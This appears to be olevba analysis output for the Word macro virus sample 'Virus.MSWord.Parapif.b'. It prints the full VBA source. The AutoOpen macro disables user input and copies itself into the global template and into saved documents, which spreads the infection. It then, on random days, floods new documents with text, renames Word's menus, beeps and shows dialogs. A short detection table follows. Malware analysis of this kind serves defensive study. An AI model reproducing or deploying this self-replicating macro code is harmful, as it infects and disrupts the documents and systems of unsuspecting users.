olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Parapif.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Parapif.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Parapif.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A
Dim B
Dim IQ
Dim aa
Dim s
Dim a_$
Dim am$
Dim IQ1
Dim aaa
Dim ss
Dim d
On Error Resume Next
WordBasic.DisableInput 1
A = 4
B = 2
IQ = WordBasic.CountMacros(0)
If IQ > 0 Then
For aa = 1 To IQ
If WordBasic.[MacroName$](aa, 0) = "AutoOpen" Then
s = 1
End If
Next aa
End If

a_$ = WordBasic.[FileName$]()
am$ = a_$ + ":AutoOpen"
If s <> 1 Then
WordBasic.MacroCopy am$, "AutoOpen", -1

End If

IQ1 = WordBasic.CountMacros(1)
If IQ1 > 0 Then
For aaa = 1 To IQ1
If WordBasic.[MacroName$](aaa, 1) = "AutoOpen" Then
ss = 1
End If
Next aaa
End If

If ss <> 1 Then
WordBasic.FileSaveAs Format:=A * 1 / B / B
WordBasic.MacroCopy "AutoOpen", am$, -1
End If

If WordBasic.Day(WordBasic.Now()) <= WordBasic.Int(Rnd() * 30) + 1 Then GoTo bye


WordBasic.FileNew
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.CenterPara
WordBasic.Insert "??!!??!!?????????????,"
WordBasic.InsertPara
WordBasic.Insert "??[?????--PART--5]!!"
For d = 1 To 10000
Next d

menu

exit_:
WordBasic.FileNew
WordBasic.CenterPara
WordBasic.FormatFont Points:=30, Underline:=1, Color:=2, Bold:=1
WordBasic.Insert "????????, ???????, ????????, sorry !! ???shift? , ??? ?? / ???? ??!!"
bye:

End Sub

Private Sub menu()
On Error Resume Next
WordBasic.RenameMenu "??", "????(F)", 0
WordBasic.RenameMenu "??", "????(E)", 0
WordBasic.RenameMenu "??", "????(V)", 0
WordBasic.RenameMenu "??", "????(I)", 0
WordBasic.RenameMenu "??", "(O)???", 0
WordBasic.RenameMenu "??", "?????(T)", 0
WordBasic.RenameMenu "??", "(A)???", 0
WordBasic.RenameMenu "??", "?????(W)", 0
WordBasic.RenameMenu "??", "????(H)", 0
bye:
qu
End Sub

Private Sub qu()
Dim c
Dim x
Dim timer_
Dim d
Dim y
WordBasic.DisableInput 1
On Error Resume Next
WordBasic.Beep
WordBasic.MsgBox "? ? ? [ ? ? ? ? ? , ? ? ? ? ] !! ? ? ? ? ? ? ? ? ? , ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ??  ", " ? ? ? ? ? ? ? ?------PART   5------ ", 32
WordBasic.Beep
WordBasic.MsgBox "? ? ? ? ? , ? ? ? ? ? !! ? ? ? ? ? , ? ? ? ? ? !! ? ? ? ? ? ? , ? ? ? ? ? , ? ? ? ? ? ? !! ? ? ? ? ? ? ?!! ", " ? ? ? ? ? ? ? ?------PART   5------ ", 32

GoTo FF

FF:
WordBasic.FileNew
WordBasic.CenterPara
WordBasic.FormatFont Points:=48, Color:=2, Bold:=1
WordBasic.CenterPara
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert ","
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.FormatFont Points:=48, Color:=6, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert ","
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 4000
Next c
WordBasic.FormatFont Points:=48, Underline:=1, Color:=1, Bold:=1

WordBasic.Insert "?"
For c = 1 To 4000
Next c
WordBasic.Insert "?"

For x = 1 To 20
WordBasic.Beep
For timer_ = 1 To 1000
Next timer_
Next x
GoTo FFF


FFF:
WordBasic.FileNew
WordBasic.CenterPara
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
For c = 1 To 4000
Next c
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert ","
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "!!"
For c = 1 To 4000
Next c
WordBasic.InsertPara
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert ","
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "!!"
For c = 1 To 6000
Next c
WordBasic.InsertPara
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 5000
Next c
WordBasic.FormatFont Points:=48, Color:=2, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 5000
Next c
WordBasic.FormatFont Points:=48, Color:=6, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "?"
For c = 1 To 2500
Next c
WordBasic.Insert "???"
For c = 1 To 25000
Next c

WordBasic.FileNew
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.CenterPara
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1

WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert ","
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1

WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert ","
For d = 1 To 6000
Next d

WordBasic.InsertPara
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert ","
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1

WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert ","
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1

WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1

WordBasic.Insert ","
For d = 1 To 2500
Next d
WordBasic.InsertPara
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1

WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=6, Bold:=1

WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.FormatFont Points:=30, Color:=1, Bold:=1
WordBasic.Insert "?"
For d = 1 To 2500
Next d
WordBasic.Insert "!!"


For y = 1 To 30
WordBasic.Beep
For timer_ = 1 To 5500
Next timer_
Next y

bye:
qu1
End Sub



Private Sub qu1()
Dim R
Dim k
R = 1
WordBasic.BeginDialog 396, 266, "? ? ? ? ? ? ? ?------PART   5------"
    WordBasic.PushButton 7, 139, 88, 21, "????", "Push1"
    WordBasic.PushButton 8, 167, 88, 21, "????", "Push2"
    WordBasic.PushButton 8, 197, 88, 21, "????", "Push3"
    WordBasic.PushButton 8, 228, 88, 21, "????", "Push4"
    WordBasic.Text 15, 7, 330, 13, "???????????,????!!!", "Text1"
    WordBasic.Text 15, 26, 328, 13, "?????????,??????????!!", "Text2"
    WordBasic.Text 15, 45, 334, 13, "???????,???????????!!", "Text4"
    WordBasic.Text 15, 64, 194, 13, "???????????!", "Text5"
    WordBasic.Text 15, 83, 336, 13, "??????????,??????????", "Text7"
    WordBasic.Text 15, 102, 330, 13, "??????????!!?????????", "Text8"
    WordBasic.Text 15, 121, 312, 13, "????????...............", "Text9"
    WordBasic.Text 110, 143, 256, 13, "?????? [????] ?!", "Text10"
    WordBasic.Text 111, 172, 256, 13, "??????,???????!", "Text11"
    WordBasic.Text 110, 201, 256, 13, "???????????!!", "Text12"
    WordBasic.Text 109, 232, 224, 13, "???????? [?x??]?!", "Text13"
WordBasic.EndDialog

QQ:
WordBasic.Beep
Dim pig5 As Object: Set pig5 = WordBasic.CurValues.UserDialog
k = WordBasic.Dialog.UserDialog(pig5)
If k = 1 Then
WordBasic.Beep
WordBasic.MsgBox "??! ??! ????! ???????[??]??????  !????????,????[????]?!!?????????golf???!! (????,???????!!)", "????????,????,??????------PART   5------", 16
End If
If k = 2 Then
WordBasic.Beep
WordBasic.MsgBox " ? ! ? ! ????? ! ?????????????? ?!??? [?] ?????,????!!????? [??????] ?!! (????,???????!!)", "????????,????,??????------PART   5------", 16

End If
If k = 3 Then
WordBasic.Beep
WordBasic.MsgBox "?!! ??????????[?]! ???????? !! ???????????????? !! ??????? [??] , ??! ??!!??????! ?!! ??????????????! ???????????! ???[?]????! (????,???????!!)", "????????,????,??????------PART   5------", 16
End If
If k = 4 Then
WordBasic.Beep
WordBasic.MsgBox "????????? ?? ????????????????????? ??????????,????????? ???????[????]??? ??? ! ??? ! ?????[?X??] ???????!!? [ ?? ]???,?~~~~~~~~~~~??!! (????,???????!!)", "????????,????,??????------PART   5------", 16
End If
R = R + 1
If R <= 4 Then GoTo QQ

bye:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

